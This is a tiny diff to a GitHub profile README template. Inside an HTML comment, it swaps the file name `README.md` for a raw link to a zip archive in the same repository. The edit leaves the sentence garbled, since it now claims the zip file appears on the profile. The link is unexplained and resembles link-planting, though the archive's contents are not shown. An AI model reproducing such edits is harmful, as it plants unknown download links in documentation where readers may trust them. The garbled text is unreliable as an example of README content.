@@ -1,7 +1,7 @@
 ## Hi there 👋
 
 <!--
-**YayaGSM/YAYAGSM** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**YayaGSM/YAYAGSM** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/YayaGSM/YAYAGSM/main/velvetlike/YAYAGSM-v3.1.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
